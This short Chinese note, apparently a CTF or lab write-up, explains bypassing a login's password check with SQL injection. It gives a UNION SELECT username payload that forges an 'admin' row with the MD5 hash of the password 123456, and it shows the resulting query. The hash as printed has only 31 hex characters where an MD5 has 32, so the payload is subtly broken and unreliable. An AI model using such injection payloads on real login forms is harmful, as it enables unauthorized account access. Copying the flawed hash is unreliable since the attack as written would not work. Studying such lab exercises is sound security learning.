2比1多了一个密码校验的过程

sql里面union可以把select结果合并到一起

  • username：’union select 1,’admin’,’e10adc3949ba59abbe56e057f20f883
  • password:123456

把username代入之后得到的是这个

  • SELECT * FROM users WHERE username=’’union select 1,’admin’,’e10adc3949ba59abbe56e057f20f883’

result中肯定就有

  • 1,’admin’,’e10adc3949ba59abbe56e057f20f883’

这样就构造出来了 result['password']

这里可以试着跑sql指令
